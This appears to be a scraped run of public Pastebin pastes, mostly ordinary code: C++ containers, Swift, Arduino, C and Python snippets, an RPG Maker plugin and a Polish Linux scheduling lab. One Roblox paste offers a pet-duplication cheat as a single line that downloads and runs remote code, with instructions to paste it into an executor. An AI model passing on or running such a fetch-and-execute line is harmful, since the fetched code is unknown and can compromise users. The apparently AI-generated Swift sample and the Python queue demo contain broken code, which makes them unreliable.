        bool operator!=(const Iterator& other) const {
            return current != other.current;
        }

        bool operator==(const Iterator& other) const {
            return current == other.current;
        }
    };

    Iterator begin() {
        return Iterator(head.get());
    }

    Iterator end() {
        return Iterator(nullptr);
    }
};"
6e9eYjEW,multi_queue,naren_paste,Python,Monday 13th of May 2024 09:42:46 AM CDT,"import queue
import multiprocessing

def producer(q):
    for i in range(10):
        q.put(i)

def consume(q):
    while True:
        item = q.get()
        if item is None:
            break
        print(item)

if __name__ == '__main__':
    queue = queue.Queue()  # Using queue.Queue instead of multiprocessing.Queue
    m1 = multiprocessing.Process(target=producer, args=(queue,))
    m2 = multiprocessing.Process(target=consume, args=(queue,))
    m1.start()
    m2.start()
    queue.put(""sudh"")
    m1.join()
    m2.join()
"
xy8SxHrH,llama 3 70B sample,marcusziade,Swift,Monday 13th of May 2024 09:16:30 AM CDT,"
import UIKit
import AVFoundation

class VideoPlayerViewController: UIViewController {
    // Video player view
    let playerView = UIView()

    // AVPlayer instance
    var player: AVPlayer?

    // Video URL
    var videoURL: URL?

    // Buttons and controls
    let playPauseButton = UIButton(type: .system)
    let stopButton = UIButton(type: .system)
    let rewindButton = UIButton(type: .system)
    let fastForwardButton = UIButton(type: .system)
    let volumeSlider = UISlider()
    let timeLabel = UILabel()
    let currentTimeLabel = UILabel()

    // Video playback state
    var isPlaying = false

    override func viewDidLoad() {
        super.viewDidLoad()

        // Set up player view
        playerView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(playerView)
        NSLayoutConstraint.activate([
            playerView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            playerView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            playerView.topAnchor.constraint(equalTo: view.topAnchor),
            playerView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])

        // Set up buttons and controls
        playPauseButton.setTitle(""Play"", for: .normal)
        playPauseButton.addTarget(self, action: #selector(playPauseButtonTapped), for: .touchUpInside)
        stopButton.setTitle(""Stop"", for: .normal)
        stopButton.addTarget(self, action: #selector(stopButtonTapped), for: .touchUpInside)
        rewindButton.setTitle(""Rewind"", for: .normal)
        rewindButton.addTarget(self, action: #selector(rewindButtonTapped), for: .touchUpInside)
        fastForwardButton.setTitle(""Fast Forward"", for: .normal)
        fastForwardButton.addTarget(self, action: #selector(fastForwardButtonTapped), for:
.touchUpInside)

        volumeSlider.minimumValue = 0
        volumeSlider.maximumValue = 1
        volumeSlider.value = 0.5
        volumeSlider.addTarget(self, action: #selector(volumeSliderValueChanged), for: .valueChanged)

        timeLabel.text = ""00:00""
        currentTimeLabel.text = ""00:00""

        // Add buttons and controls to the view
        let buttonStackView = UIStackView(arrangedSubviews: [playPauseButton, stopButton, rewindButton,
fastForwardButton])
        buttonStackView.axis = .horizontal
        buttonStackView.distribution = .fillEqually
        buttonStackView.spacing = 10

        let controlStackView = UIStackView(arrangedSubviews: [volumeSlider, timeLabel,
currentTimeLabel])
        controlStackView.axis = .vertical
        controlStackView.distribution = .fillProportionally
        controlStackView.spacing = 10

        view.addSubview(buttonStackView)
        view.addSubview(controlStackView)

        NSLayoutConstraint.activate([
            buttonStackView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            buttonStackView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            buttonStackView.topAnchor.constraint(equalTo: playerView.bottomAnchor, constant: 20),

            controlStackView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            controlStackView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            controlStackView.topAnchor.constraint(equalTo: buttonStackView.bottomAnchor, constant: 10)
        ])
    }

    // Play/pause button tapped
    @objc func playPauseButtonTapped() {
        if isPlaying {
            player?.pause()
            playPauseButton.setTitle(""Play"", for: .normal)
            isPlaying = false
        } else {
            player?.play()
            playPauseButton.setTitle(""Pause"", for: .normal)
            isPlaying = true
        }
    }

    // Stop button tapped
    @objc func stopButtonTapped() {
        player?.stop()
        player?.seek(to: CMTime.zero)
        currentTimeLabel.text = ""00:00""
        isPlaying = false
    }

    // Rewind button tapped
    @objc func rewindButtonTapped() {
        guard let player = player else { return }
        let currentTime = player.currentTime()
        let newTime = currentTime - 10
        if newTime < 0 {
            player.seek(to: CMTime.zero)
        } else {
            player.seek(to: newTime)
        }
    }

    // Fast forward button tapped
    @objc func fastForwardButtonTapped() {
        guard let player = player else { return }
        let currentTime = player.currentTime()
        let duration = player.currentItem?.duration
        let newTime = min(currentTime + 10, duration)
        player.seek(to: newTime)
    }

    // Volume slider value changed
    @objc func volumeSliderValueChanged() {
        guard let player = player else { return }
        player.volume = volumeSlider.value
    }

    // Set up video playback
    func setupVideoPlayback(url: URL) {
        videoURL = url
        player = AVPlayer(url: videoURL)

        // Create a player layer and add it to the player view
        let playerLayer = AVPlayerLayer(player: player)
        playerLayer.frame = playerView.bounds
        playerView.layer.addSublayer(playerLayer)

        // Add observers for playback state changes
        NotificationCenter.default.addObserver(self, selector: #selector(playbackStateChanged), name:
.AVPlayerItemDidPlayToEndTime, object: player?.currentItem)
    }

    // Playback state changed (e.g. video ended)
    @objc func playbackStateChanged() {
        stopButtonTapped()
    }
}

This `UIViewController` has the following features:

* A `UIView` to display the video
* An `AVPlayer` instance to play the video
* Buttons for playing/pausing, stopping, rewinding, and fast forwarding
* A volume slider to control the audio level
* Labels to display the current time and duration of the video

To use this view controller, simply create an instance of it and call the `setupVideoPlayback` method
with a valid `URL` for the video. For example:
```swift
let videoViewController = VideoPlayerViewController()
videoViewController.setupVideoPlayback(url: URL(string: ""https://example.com/video.mp4"")!)
```
Note that this is just an example implementation, and you may want to customize it to fit your specific
needs (e.g. add error handling, display video thumbnails, etc.)."
e7RsCuKR,Untitled,MeehoweCK,C++,Monday 13th of May 2024 09:11:31 AM CDT,"#include <iostream>
#include <iterator>
#include <memory>
#include <stdexcept>

template <typename T>
class MyList {
    friend std::ostream& operator<<(std::ostream& os, const MyList& list) {
        if (list.list_size == 0) {
            os << ""The list is empty\n"";
        }
        else {
            os << ""List elements:\n"";
            for (auto i : list) {
                os << '\t' << i << std::endl;
            }
        }
        return os;
    }
private:
    struct Node {
        T data;
        std::unique_ptr<Node> next;
        Node(T data) : data{ data }, next{ nullptr } {}
    };

    std::unique_ptr<Node> head;
    size_t list_size{ 0 };

public:
    MyList() : head{ nullptr } {}
    ~MyList() { clear(); }

    void push_front(const T& value) {
        std::unique_ptr<Node> newNode{ std::make_unique<Node>(value) };
        newNode->next = std::move(head);
        head = std::move(newNode);
        ++list_size;
    }

    T pop_front() {
        if (head == nullptr) {
            throw std::out_of_range(""Cannot pop from an empty list"");
        }
        T data{ std::move(head->data) };
        head = std::move(head->next);
        --list_size;
        return data;
    }

    T& front() {
        if (head == nullptr) {
            throw std::out_of_range(""List is empty"");
        }
        return head->data;
    }

    const T& front() const {
        if (head == nullptr) {
            throw std::out_of_range(""List is empty"");
        }
        return head->data;
    }

    void clear() {
        while (head != nullptr) {
            head = std::move(head->next);
            --list_size;
        }
    }

    size_t size() const { return list_size; }

    void remove(const T& value) {
        while (head != nullptr && head->data == value) {
            head = std::move(head->next);
            --list_size;
        }

        Node* current{ head.get() };
        while (current && current->next) {
            if (current->next->data == value) {
                current->next = std::move(current->next->next);
                --list_size;
            }
            else {
                current = current->next.get();
            }
        }
    }

    class ConstIterator {
    private:
        const Node* current;

    public:
        using difference_type = std::ptrdiff_t;
        using value_type = T;
        using pointer = const T*;
        using reference = const T&;
        using iterator_category = std::forward_iterator_tag;

        ConstIterator(const Node* node) : current{ node } {}

        ConstIterator& operator++() {
            if (current) {
                current = current->next.get();
            }
            return *this;
        }

        ConstIterator operator++(int) {
            ConstIterator tmp = *this;
            ++(*this);
            return tmp;
        }

        reference operator*() const {
            if (!current) {
                throw std::out_of_range(""Dereferencing a null iterator"");
            }
            return current->data;
        }

        pointer operator->() const {
            if (!current) {
                throw std::out_of_range(""Dereferencing a null iterator"");
            }
            return &current->data;
        }

        bool operator!=(const ConstIterator& other) const {
            return current != other.current;
        }

        bool operator==(const ConstIterator& other) const {
            return current == other.current;
        }
    };

    ConstIterator begin() const {
        return ConstIterator(head.get());
    }

    ConstIterator end() const {
        return ConstIterator(nullptr);
    }
};"
Z9Ua8HWs,concatenate ranges,ulfben,C++,Monday 13th of May 2024 09:05:46 AM CDT,"#include <vector>
#include <list>
#include <span>
#include <iterator>

template<typename T>
class concat_view {
public:
    using value_type = T;
    using const_pointer = const value_type*;
    using const_reference = const value_type&;

    concat_view(std::initializer_list<std::span<const T>> spans) : spans_(spans) {}

    class iterator {
    public:
        using value_type = T;
        using difference_type = std::ptrdiff_t;
        using pointer = const T*;
        using reference = const T&;
        using iterator_category = std::input_iterator_tag;

        iterator(std::vector<std::span<const T>> const& spans, size_t outer, size_t inner)
            : spans_(spans), outer_(outer), inner_(inner) {
            advance_past_empty_spans();
        }

        reference operator*() const {
            return spans_[outer_][inner_];
        }

        iterator& operator++() {
            ++inner_;
            advance_past_empty_spans();
            return *this;
        }

        bool operator==(const iterator& other) const {
            return outer_ == other.outer_ && inner_ == other.inner_;
        }

        bool operator!=(const iterator& other) const {
            return !(*this == other);
        }

    private:
        std::vector<std::span<const T>> spans_;
        size_t outer_ = 0;
        size_t inner_ = 0;

        void advance_past_empty_spans() {
            while (outer_ < spans_.size() && inner_ == spans_[outer_].size()) {
                ++outer_;
                inner_ = 0;
            }
        }
    };

    iterator begin() const {
        return iterator(spans_, 0, 0);
    }

    iterator end() const {
        return iterator(spans_, spans_.size(), 0);
    }

private:
    std::vector<std::span<const T>> spans_;
};

"
NbP1sbD4,EasyButton Library rev_01,pleasedontcode,Arduino,Monday 13th of May 2024 08:50:44 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: EasyButton Library
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-13 13:49:55

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* The device to be made is equipped with 7 LEDs and */
	/* 3 buttons. At startup, all LEDs are off. The first */
	/* button is used to increase the binary number by 1, */
	/* the second to decrease the binary number by 1, and */
	/* the third to display on the serial monitor the */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h> //https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t btn_PushButton_PIN_D2 = 2;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/

// Instance of the button
EasyButton button(btn_PushButton_PIN_D2);

// Callback function to be called when the button is pressed
void onPressed()
{
  Serial.println(""Button pressed"");
}

void setup(void)
{
  // put your setup code here, to run once:
  pinMode(btn_PushButton_PIN_D2, INPUT_PULLUP);

  // Initialize the button
  button.begin();
  // Add the callback function to be called when the button is pressed
  button.onPressed(onPressed);
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  button.read();
}

/* END CODE */"
X96N3q9h,Untitled,dllbridge,C,Monday 13th of May 2024 08:44:37 AM CDT,"


#include <stdio.h>
#include <string.h>
 
char sz[19]=""SONY_Pictures"";

//////////////////////////////////////////////////////////
int main()                                              //
{

    int n = strlen(sz); 
     
    for(int i=0; i < n; i++)
    {
   
        printf(""%s\n"", &sz[i]);
    }
}























   //  printf(""%s\n"",sz);
     //   printf(""%s\n"",&sz[1]);



/*


#include <stdio.h>

char sz[77] = ""SONY_Pictures"";


///////////////////////////////////////////////////////////////
int main() 
{

    
    printf(""%s\n"", sz);
    
    printf(""%s\n"", &sz[1]);   
    printf(""%s\n"", &sz[2]);      
    

	
return 0;
}




*/






















/*
    printf(""%c\n"", *sz   );    
    printf(""%c\n"",  sz[1]);    
    printf(""%c\n"",  sz[2]);
    printf(""%c\n"",  sz[3]);      
    printf(""%d\n"",  sz[4]);  	


*/













/*


#include <stdio.h>

char sz[7] = ""SONY"";


///////////////////////////////////////////////////////////////
int main() 
{

    
    printf(""%d\n"", sz[0]);
    printf(""%d\n"", sz[1]);    
    printf(""%d\n"", sz[2]);
    printf(""%d\n"", sz[3]);      
    printf(""%d\n"", sz[4]);  	
	
return 0;
}



*/



"
rZjA6hQJ,Adopt me Dupe Pets🔥🤫,Bacon_Script,Lua,Monday 13th of May 2024 08:39:31 AM CDT,"loadstring(game:HttpGet('https://pastebin.com/raw/pak6ZxpQ'))()

Copy and paste this to your executor🤫🔥"
VkdN5C3a,Farkle Point Logic,MeckeOfficial,Python,Monday 13th of May 2024 08:28:22 AM CDT,"def calc_points(points):

    result = 0

    score = {
        ""1"":0,
        ""2"":0,
        ""3"":0,
        ""4"":0,
        ""5"":0,
        ""6"":0,
    }

    for p in points:
        score[str(p)] += 1

    a = score[""1""]
    b = score[""2""]
    c = score[""3""]
    d = score[""4""]
    e = score[""5""]
    f = score[""6""]

    if a and b and c and d and e and f == 1:
        result += 1500
        
    elif a and b and c and d and e >= 1:

        if a == 2:
            result += 100
        elif e == 2:
            result += 50
        
        result += 500
    
    elif b and c and d and e and f >= 1:

        if a == 2:
            result += 100
        elif e == 2:
            result += 50
        
        result += 750

    for k in score:
        if score[k] < 3:

            if int(k) == 1:
                result += 100 * score[k]
            elif int(k) == 5:
                result += 50 * score[k]

        if score[k] == 3:
            if int(k) == 1:
                result += 1000
            else:
                result += int(k) * 100

        elif score[k] == 4:
            if int(k) == 1:
                result += 2000
            else:
                result += int(k) * 100 * 2

        elif score[k] == 5:
            if int(k) == 1:
                result += 4000
            else:
                result += int(k) * 100 * 4

        elif score[k] == 6:
            if int(k) == 1:
                result += 8000
            else:
                result += int(k) * 100 * 8

    return result"
puiuQ7XS,GWComboSwitch.js,kura2yamato,JavaScript,Monday 13th of May 2024 08:23:35 AM CDT,"//---------------------------------------------------------
// GWComboSwitch.js 
// Copyright (c) 2024 GBison. All rights reserved.
// Released under the MIT license.
// http://opensource.org/licenses/mit-license.php
//=========================================================

/*:
 * @plugindesc Combo System By Checking the Switch. 
 * @author Gbison 
 * @version 1
 *
 * @param Plugin Version 
 * @desc Version for the Plugins
 *
 * @param Version
 * @type number
 * @default 0 
 * @parent Plugin Version
 *
 * @param Sub Version
 * @type number
 * @range 0,99
 * @desc Variable to Use
 * @default 0 
 * @parent Plugin Version
 *
 * @param Condition 
 * @desc Condition For Action
 *
 * @param Combo Condition
 * @desc Condition For Combo
 * @parent Condition
 *
 * @param Combo Switch
 * @type switch
 * @default 10 
 * @desc Switch to use
 * @parent Combo Condition
 *
 * @param Combo Variable
 * @type variable
 * @default 10 
 * @desc Variable to Use
 * @parent Combo Condition
 *
 * @param Slice Condition
 * @desc Condition For Slice
 * @parent Condition
 *
 * @param Slice Switch
 * @type switch
 * @default 11 
 * @desc Switch to use
 * @parent Slice Condition
 *
 * @param Slice Variable
 * @type variable
 * @default 11 
 * @desc Variable to Use
 * @parent Slice Condition
 *
 * @param Strike Condition
 * @desc Condition For Strike
 * @parent Condition
 *
 * @param Strike Switch
 * @type switch
 * @default 12 
 * @desc Switch to use
 * @parent Strike Condition
 *
 * @param Strike Variable
 * @type variable
 * @default 12 
 * @desc Variable to Use
 * @parent Strike Condition
 *
 * @param Stab Condition
 * @desc Condition For Stab
 * @parent Condition
 *
 * @param Stab Switch
 * @type switch
 * @default 13 
 * @desc Switch to use
 * @parent Stab Condition
 *
 * @param Stab Variable
 * @type variable
 * @default 13
 * @desc Variable to Use
 * @parent Stab Condition
 *
 * @help
 * Copyright (c) 2024 GBison. All rights reserved.
 * Released under the MIT license.
 * ===================================================================
 * The Idea from JoeBumpster
 * https://forums.rpgmakerweb.com/index.php?threads/no-idea-why-this-switch-wont-flip.168634/
 * To use this, just run plugin 
 *     GWComboStat ComboIncrease
*/

(function() {
    // parameters
    var _thisPluinName = 'GWComboSwitch'; //change with your filename.
    var parameters = PluginManager.parameters(_thisPluinName);

    var _combo = {
        ""switch"": Number(parameters['Combo Switch'] || 10),
        ""variable"": Number(parameters['Combo Variable'] || 10)
    };
    var _slice = {
        ""switch"": Number(parameters['Slice Switch'] || 11),
        ""variable"": Number(parameters['Slice Variable'] || 11)
    };
    var _strike = {
        ""switch"": Number(parameters['Strike Switch'] || 12),
        ""variable"": Number(parameters['Strike Variable'] || 12)
    };
    var _stab = {
        ""switch"": Number(parameters['Stab Switch'] || 13),
        ""variable"": Number(parameters['Stab Variable'] || 13)
    };

    var _Game_Interpreter_pluginCommand = Game_Interpreter.prototype.pluginCommand;
    Game_Interpreter.prototype.pluginCommand = function(command, args) {
        _Game_Interpreter_pluginCommand.call(this, command, args);
        runPlugins = false;
        if (command === 'GWComboStat') {
            switch (args[0]) {
                case 'ComboIncrease':
                    $gameSystem.ComboIncrease();
                    runPlugins = [command, args];
                    break;
            }

        }

    };

    Game_System.prototype.ComboIncrease = function() {

        let listCond = [];
        let switchID = 0;
        let varID = 0;
        let oldValue = 0;
        let switchStat = 0;
        //=====combo================= 
        listCond = _combo;

        switchID = listCond.switch;
        varID = listCond.variable;
        oldValue = $gameVariables.value(varID);
        switchStat = $gameSwitches.value(switchID);
        /*Check result*/
        if (switchStat) {
            $gameVariables.setValue(varID, ++oldValue);
            $gameSwitches.setValue(switchID, 0);
        }
        //=====SLICE================= 
        listCond = _slice;

        switchID = listCond.switch;
        varID = listCond.variable;
        oldValue = $gameVariables.value(varID);
        switchStat = $gameSwitches.value(switchID);
        /*Check result*/
        if (switchStat) {
            $gameVariables.setValue(varID, ++oldValue);
            $gameSwitches.setValue(switchID, 0);
        }


        //=====STRIKE================= 
        listCond = _strike;

        switchID = listCond.switch;
        varID = listCond.variable;
        oldValue = $gameVariables.value(varID);
        switchStat = $gameSwitches.value(switchID);
        /*Check result*/
        if (switchStat) {
            $gameVariables.setValue(varID, ++oldValue);
            $gameSwitches.setValue(switchID, 0);
        }


        //=====STAB================= 
        listCond = _stab;

        switchID = listCond.switch;
        varID = listCond.variable;
        oldValue = $gameVariables.value(varID);
        switchStat = $gameSwitches.value(switchID);
        /*Check result*/
        if (switchStat) {
            $gameVariables.setValue(varID, ++oldValue);
            $gameSwitches.setValue(switchID, 0);
        }

    };



})();

/*
The Idea from JoeBumpster
 https://forums.rpgmakerweb.com/index.php?threads/no-idea-why-this-switch-wont-flip.168634/
I have a combo system in my game which increases a variable by 1 for each time you land a hit. The way I have it registering if the attack landed or not is by flipping a switch on whenever
Source:
https://forums.rpgmakerweb.com/index.php?threads/no-idea-why-this-switch-wont-flip.168634/

Refference:
https://forums.rpgmakerweb.com/index.php?threads/parameter-structs.105978/
https://docs.google.com/document/d/1Ep71x_l0BVbNkyW2-b_63Li8UFZcAyJQVSNQL-C7ETI/edit?usp=sharing
*/"
QPSKDj2B,zad_4_odp_full_DLC_EXPANSION_V2_autoliczenie,pan7nikt,Bash,Monday 13th of May 2024 08:13:24 AM CDT,"#README
#ZAKTUALIZOWANE 13.05.2024 PRZED ODPOWIEDZIA
#!!!!!!!!!!!!!!!WIELOLINIJKOWE ECHO WKLEJAC NARAZ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#WSZYSTKO WYKONYWAC JAKO ROOT
#KOMENDY ZE SREDNIKAMI NA KONCU POWINNY BYC WRZUCANE NARAZ
#PRZED KAZDYM ZADANIEM JEST PODANA ILOSC WYMAGANYCH TERMINALI
#KAZDY TERMINAL MA PRZYPISANA CYFRE np. 1:
#Z REGULY TERMINAL 1 JEST DO LISTINGOW A TERMINAL 2 JEST ROBoCZY
#ZALECA SIE ROBIC KAZDY PODPUNKT W ODDZIELNYM TERMINALU (latwiej clearowac), A TERMINAL ROBOCZY (2) MIEC JEDEN DLA WSZYSTKICH


/////////////////////////////////////////////////////////////KONIEC LISTINGOW/////////////////////////////////////////////////////////////////////////////////////////////////////

4.1.1.4 Do czego sluzy klasyfikacja procesow na ograniczone procesorem i ograniczone wejsciem wyjsciem oraz na jakiej podstawie zweryfikowano, ze proces jest ograniczony wejsciem-wyjsciem? 
#ILOSC TERMINALI:  2
    1:
    echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.4]-----------------------------------------------------------------------------\033[0m
    
    \033[0;32mPozwala okreslic w jaki sposob usprawnic realizacje zadan przez proces\033[0m

	dodatkowo pozwala okreslic w jakim stanie spedza wiekszosc czasu cyklu zycia.
	\033[0;32mOgraniczone procesorem\033[0m - spedzaja wiekszosc czasu w stanie wykonywanym.
	\033[0;32mOgranioczone wejsciem-wyjsicem\033[0m - spedzaja wiekszosc czasu w stanie zablokowanym
    \033[0;32mStan zablokowany\033[0m - oczekuje na pozostale zasoby systemowe oprocz stron pamieci

    \033[0;32m
    zeby wiedziec jak usprawnic realizacje zadania/zadan przez proces. Dla procesow
    ograniczonych procesorem mozemy zwiekszyc przydzial jednostek przetwarzajacych, a w
    procesach ograniczonych wejsciem wyjsciem mozna poprawic warunki realizacji operacji
    dyskowych.
    \033[0m

    Jezeli proces zglasza operacje dyskowe to mozemy poprawic warunki realizacji operacji
    dyskowych.

    Nie kazda operacje wejscia wyjscia mozna usprawnic, ale operacje dyskowe akurat mozna.

    \033[0;32mOperacje dyskowe wejscia wyjscia\033[0m to odczyt i zapis
    
    proces moze przebywac w stanie \033[0;32mzablokowanym, wykonywanym i gotowym do wykonania\033[0m

    \033[0;32mReal\033[0m – calkowity czas istnienia procesu – czas cyklu zycia procesu
    \033[0;32mRuntime\033[0m – czas przebywania procesu w stanie wykonywanym (Wirtualny czas zycia procesu)
    \033[0;32mswitches*avg delay\033[0m – czas przebywania procesu w stanie gotowym do wykonania
    \033[0;32mswitches\033[0m – przelaczenia kontekstu, w ktorych ten proces uczestniczyl
    \033[0;32mavg delay\033[0m – sredni czas oczekiwania na przydzial jednostki przetwarzajacej
    ""

 
 2:
 echo bfq > /sys/block/sda/queue/scheduler
 variable=""""$({   time perf sched record timeout 60 dd if=/dev/sda of=/dev/null bs=512K >/dev/null; } 2>&1 | grep real)""""
 echo $variable

 1:
#W TRAKCIE DZIALANIA PROCESU
 cat /proc/$(pidof dd -s)/status | grep Threads
 ps -o pid,etime,cputime,%cpu $(pidof dd -s)
 pmap -x $(pidof dd -s)
 pmap -X $(pidof dd -s) | grep --color -E ""stack|heap|$""

 echo -e ""\033[0;32mVSZ\033[0m - rozmiar stron\n \033[0;32mRSZ\033[0m - rozmiar ramek""
 ps -o pid,vsz,rsz $(pidof dd -s)
 cat /proc/$(pidof dd -s)/status | grep Threads

 2:
 #PO ZAKONCZENIU PROCESU W TERMINALU 2 (60s)

#tu wszystko naraz az do komentarxa z koncem
real=${variable#*0m}
real=${real%%s*}
real=$(tr ',' '.' <<<""$real"")
real=$(echo ""scale=2; ($real * 1000)"" | bc)

variable=""$( perf sched latency -p | grep -e ""dd"")""
runtime=${variable#*|}
runtime=${runtime%%ms*}
variable=""$( perf sched latency -p | grep -e ""dd"")""
avg=${variable#*avg:}
avg=${avg%%ms*}
variable=""$( perf sched latency -p | grep -e ""dd"")""
switches=${variable#*ms |}
switches=${switches%% |*}

lockedTime=$(echo ""scale=2; $real - $runtime - ($switches * $avg)"" | bc)
lockedPercentage=$(echo ""scale=2; $lockedTime / $real * 100"" | bc)

echo ""
runtime[ms]:     $runtime ms
avg delay[ms]:      $avg ms
switches:      $switches
real[s]:              $real ms
Czas w stanie zablokowanym: $lockedTime ms
Procent w stanie zablokowanym: $lockedPercentage %
"";
#KONIEC


 perf sched latency -p | grep -e ""Task"" -e ""dd""
 echo -e ""Czas w stanie zablkowanym = real - runtime - (switches * avg)
Procent w czasie zablokowanym = Czas w stanie zablokowanym / real * 100%""

4.1.1.5 (brakujace). Sekretne pytanie brakujace z wikampa: Jak okreslic cykl zycia procesu i czym jest wirtualny czas zycia procesu? - wymagane zaprezentowania odpowiednich wartosci w listingu
#ILOSC TERMINALI: 1
 1:
 echo -e ""
 \033[0;32m-------------------------------------------------------[4.1.1.5]-----------------------------------------------------------------------------\033[0m
 \033[0;32mCykl zycia procesu\033[0m to calkowity czas przez jaki istnial proces (\033[0;32mreal\033[0m)
 \033[0;32mWirtualny czas zycia procesu\033[0m to czas w jakim kod programu byl wykonywany / czas realizacjizadania / czas w stanie wykonywanym (\033[0;32mruntime\033[0m)""
 
 echo bfq > /sys/block/sda/queue/scheduler
 time perf sched record ionice -c 1 -n 0 stress -i 1 -t 3
 perf sched latency -p | grep -e ""Task"" -e ""stress""

4.1.1.6 Co reprezentuje wartosc %cpu dla procesu jednowatkowego? - dla jakiego procesu wartosc %cpu moze przekroczyc 100%?
#ILOSC TERMINALI: 2
	1:
	echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.6]-----------------------------------------------------------------------------\033[0m
cputime / etime * 100% -- procent cyklu zycia w kotrym proces przebywal w stanie wykonywanym (suma wirtualnych czasow zycia watku musi byc wiekszy niz czas zycia procesu)
Ta wartosc reprezentuje czas przetwarzania podzielony przez czas zycia procesu.
\033[0;32mstosunek wirtualnego czasu zycia procesu do jego rzeczywistego czasu zycia procesu \033[0m (runtime/real)

\033[0;32mReal\033[0m – calkowity czas istnienia procesu – czas cyklu zycia procesu
\033[0;32mRuntime\033[0m – czas przebywania procesu w stanie wykonywanym

\033[0;32mMoze przekroczyc 100%\033[0m Dla procesu posiadajacego wiele watkow, ktore wiekszosc czasu spedzaja w stanie wykonywanym
czyli
jesli sumaryczny czas przetwarzania zadan przez watki jest wiekszy niz czas cyklu zycia procesu.""

#WIELOWATKOWY
	2:
	sysbench --test=cpu --threads=2 --time=70 run
	1:
    echo -e ""\033[0;32mWieloowatkowy\033[0m""
    cat /proc/$(pidof sysbench -s)/status | grep Threads
	ps -o pid,cmd,nlwp,%cpu,cputime,etime ""$(pidof sysbench -s)"" ;ps -o pid,spid,%cpu,cputime,etime -T ""$(pidof sysbench -s)"" | grep --color -E "" %CPU|$"" 

#JEDNOWATKOWY
    2:
    echo bfq > /sys/block/sda/queue/scheduler
    time perf sched record dd if=/dev/sda of=/dev/null
	#sysbench --test=cpu --threads=1 --time=70 run
    1:
    echo -e ""\033[0;32mJednowatkowy\033[0m"";
    echo -e ""Dla procesu jednowatkowego \033[0;32mnie moze przekroczyc 100%\033[0m"";
    cat /proc/$(pidof dd -s)/status | grep Threads;
     #PO CHWILI PRZERWAC DD ZA POMOCA CTRL + C (raz)
	ps -o pid,cmd,nlwp,%cpu,cputime,etime ""$(pidof dd -s)"" ;ps -o pid,spid,%cpu,cputime,etime -T ""$(pidof dd -s)"" | grep --color -E "" %CPU|$"" 

4.1.1.7 (1). Co reprezentuje wartosc %mem dla procesu? - wymagane wykazanie w listingach wartosci, na bazie ktorych %mem jest wyliczany
#ILOSC TERMINALI: 2
	1:
	echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.7 (1)]-----------------------------------------------------------------------------\033[0m
    \033[0;32mJest to stosunek pamieci fizycznej ulotnej przydzielonej procesowi do calkowitej fizycznej ulotnej pamieci ktora
    dysponuje system (RSZ / Total online memory[w tym przypadku 6G])\033[0m
    \033[0;32m%MEM\033[0m = RSZ / MEM total * 100%
    \033[0;32mRSS\033[0m (\033[0;32mRSZ\033[0m) - ZBIOR ROBOCZY (working set), zbior ramek dla procesu, tworzy obszar roboczy
    \033[0;32mtotal\033[0m - fizyczna pamiec ulotna maszyny
    \033[0;32mTablica stron\033[0m - zawiera uzywane przez proces \033[0;32mramki ze stronami\033[0m, jest nieciagla i hierarchiczna
    \033[0;32mobszar roboczy\033[0m - zbior ramek
    \033[0;32mlsmem\033[0m - pokazuje calkowita pamiec ulotna fizyczna maszyny
    \033[0;32mfree\033[0m - pokazuje dostepna (uzyteczna) pamiec ulotna [pamiec fizyczna - kernel - zarezerwowana przez system]""

	2:
	stress -m 1 -t 60

	1:
    lsmem | grep --color -E ""Total online memory:|$""
	ps -o pid,%mem,rsz ""$(pidof stress -s)"" | grep --color -E "" %MEM|total|$"" ; free | grep --color -E ""total|$""


4.1.1.7 (2). Czy calosc jego kodu i danych jest wczytywana z pliku programu ELF oraz plikow bibliotek ELF do fizycznej pamieci ulotnej?  
- wymagane zaprezentowania odpowiednich wartosci dla segmentu danych i tekstu w listingu z mapa pamieci procesu jednowatkowego.
#ILOSC TERMINALI: 2

    1:
	echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.7 (2)]-----------------------------------------------------------------------------\033[0m
\033[0;32mNie wszystkie\033[0m, czesc kodu i danych wczytywana jest z segmentow anonimowych.
\033[0;32mr-x\033[0m - zawiera text
Dane:
\033[0;32mrw-\033[0m - zawiera zmienna
\033[0;32mr--\033[0m - zawiera stala

Jezeli rozmiar \033[0;32mKbytes\033[0m i \033[0;32mRSS\033[0m sa inne oznacza to, ze nie wszystkie strony zostaly wczytane do ramek
""
    2:
    echo bfq > /sys/block/sda/queue/scheduler
 	time perf sched record ionice -c 1 -n 0 stress -i 1 -t 240

    1:
    #POKAZUJESZ DOWOLNY SEGMENT (KOLOREM JEST PRZYKLADOWY ZAZNACZONY) KONIECZNIE DANYCH I ZAZNACZASZ, ZE ""Kbytes"" JEST WIEKSZE OD ""RSS""
    pmap -x $(pidof stress -s)| grep --color -E ""Kbytes|RSS| 0       0 r---- libm.so.6|$"";


4.1.1.10. Ktory z segmentow procesu zawiera sterte, a ktory stos? Czy segment sterty/stosu sa anonimowe? - wymagane wskazanie segmentu sterty i stosu w mapie pamieci wybranego procesu.
#ILOSC TERMINALI: 2
	2:
 	echo bfq > /sys/block/sda/queue/scheduler
